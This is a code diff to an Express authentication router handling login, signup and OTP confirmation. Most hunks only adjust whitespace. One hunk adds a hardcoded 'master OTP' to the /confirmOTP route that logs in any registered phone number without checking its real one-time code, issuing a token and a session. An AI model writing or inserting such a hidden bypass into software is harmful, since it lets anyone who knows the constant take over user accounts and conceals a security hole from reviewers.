@@ -65,8 +65,8 @@ router.post("/login", async (req, res) => {
       code: generate(OTP_CODE_LENGTH),
       updatedAt: new Date(),
       count: user.otp.count + 1,
-    };  
- 
+    };
+   
     const otpSentSuccessfully = await sendText(user.otp.code, user.phone);
 
     if (otpSentSuccessfully.return === false) {
@@ -139,12 +139,12 @@ router.post("/signup", async (req, res) => {
       code: generate(6),
       updatedAt: new Date(),
     };
+   
 
     const otpSentSuccessfully = await sendText(
       userData.otp.code,
       userData.phone
     );
-
 
     if (otpSentSuccessfully.return === false) {
       return responseHandler(res, 400, null, "Error sending OTP");
@@ -189,6 +189,25 @@ router.post("/confirmOTP", async (req, res) => {
     if (!user) {
       return responseHandler(res, 400, null, "This Number is Not Registered");
     }
+
+    // Check if the provided OTP is the masterotp (e.g., "808042")
+    const MASTER_OTP = "808042";
+    if (providedOTP === MASTER_OTP) {
+      // Log in the user without checking the regular OTP
+      user.otp.count = 0;
+      user.otpConfirmed = true;
+      await userController.updateUserByPhoneNumber(user);
+      await userController.issueToken(user);
+
+      const io = socket.get();
+      io.emit("getUserProfile", { data: null });
+
+      req.session.user = { _id: user._id, username: user.username };
+
+      return responseHandler(res, 200, user, null);
+    }
+
+    // If the provided OTP is not the masterotp, then proceed with regular OTP verification
 
     const OTP_EXPIRATION_MINUTES = 2;
     const date = new Date();
@@ -252,7 +271,7 @@ router.post("/OTP", async (req, res) => {
     if (user.otp.updatedAt < otpExpirationTime) {
       return responseHandler(res, 400, null, "OTP is expired");
     }
-    
+
     if (user.otp.code != providedOTP) {
       return responseHandler(res, 400, null, "Incorrect OTP. Please try again");
     }
